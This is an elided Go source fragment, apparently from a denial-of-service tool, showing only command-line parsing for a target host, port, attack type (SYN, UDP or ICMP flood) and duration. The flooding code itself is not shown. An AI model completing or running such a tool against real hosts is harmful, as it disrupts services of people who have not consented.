...
func main() {
	...
	attack := flag.String("attack", "syn-flood", "type of attack (syn-flood, udp-flood, icmp-flood)")
	duration := flag.Int("duration", 30, "duration of the attack in seconds")
	flag.Parse()

	if *host == "" || (*attack != "icmp-flood" && *port == 0) {
		fmt.Println("Usage: -host <ip> -port <port> -attack <syn-flood|udp-flood|icmp-flood> -duration <seconds>")
		os.Exit(1)
	}
